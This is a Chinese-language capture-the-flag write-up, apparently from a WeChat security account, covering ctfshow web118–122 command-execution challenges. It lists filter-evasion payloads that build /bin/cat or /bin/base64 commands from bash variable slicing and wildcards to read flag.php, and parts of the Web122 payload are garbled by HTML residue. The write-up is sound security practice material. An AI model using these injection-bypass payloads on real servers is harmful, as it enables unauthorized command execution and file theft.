---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  ctfshow web入门命令执行  
zoe
                    zoe  哦0吼   2026-02-12 23:06  
  
Web118  
  
一个输入框，没有其他提示，查看源代码，发现  
  
尝试输入ls等都被过滤了 ，看其他师傅操作，使用了bash内置变量  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEwHSedslDjbicfpWo4qzx9ahSh9licU2pwPOKdJ0kTKMibYsDMQ3icXd5gEQksYBt67gyVibvI0TahsmDpvxXsib1OhddcxvrhMoiabDQ/640?wx_fmt=png "")  
  
  
code=${PATH:~C}${PWD:~C} ????.??? 查看源代码得到flag  
  
   
  
  
  
Web119  
  
PATH被过滤了，构造不了nl flag.php，就试试构造其他的。  
  
${HOME:${#HOSTNAME}:${#SHLVL}}  
       
====>  
     
t  
  
   
  
${PWD:${Z}:${#SHLVL}}  
      
====>  
     
/  
  
   
  
/bin/cat flag.php  
  
   
  
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwAx9tTBJfiaaEcpQ6OA6flhorDN7IKvkME4DVdB4XnHRWQNoEteOanCfZibicp6e8p6S1P6Sz6r8knbnebI0Mz8WYczpBJyV7NVk/640?wx_fmt=png "")  
  
Web120  
  
有长度限制，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEzmkVfrZ8XeMnMelMBj3yfBr7vJNKZjFoftDk46qwDwxswAAiaRicFWsa2p5BicMyaGfe3qWwvowk7v4UDko0iclJ6kPNxKRhic9LjY/640?wx_fmt=png "")  
  
code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???查看源代码得到flag  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExvodj3cQ1T93Lib4QcSgOsxpA6rYeyQFCp5nQFnvO5l10dctrHlMgxPFCExjZPicGFjLiceGwIGwE7kibZyBic4wqKy0gdwqFchsu0/640?wx_fmt=png "")  
  
Web121  
  
摇骰子，随机到4位数多发几次就行  
  
/bin/base64 flag.php → /???/?????4 ????.??? → ${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???   
  
![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsExaMohQx2TzyjAPUkNtS7amF4iaClhSvqqvpcZwOwsjbUtI7Z1WYqZfHTWsY0lfzs81hEJBrufibfN1Q2B8ADnfqsmYDYooFdqlM/640?wx_fmt=png "")  
  
Web122  
  
code=     <A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???< span>      </A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?}>  
  
构造错误命令，使$?的结果为1，代替${##}来分割  
  
用命令     <A然后下一条命令中的$?就等价于1了，< span>      </A然后下一条命令中的$?就等价于1了，<>  
  
构造/bin/base64 flag.php => /???/????6? ????.??? =>      <A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? < span>      </A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}?>  
  
要多试几次  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsExxJCHJuzDlOHwSIDMM2Gnhp9n96n4yVBXDCd3GJFKfv5wlGib7IwGOsZWqHT4sGp8ia9YdRSeahWuAeB1C8IEdCFibiaJeF0IicYbk/640?wx_fmt=png "")  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
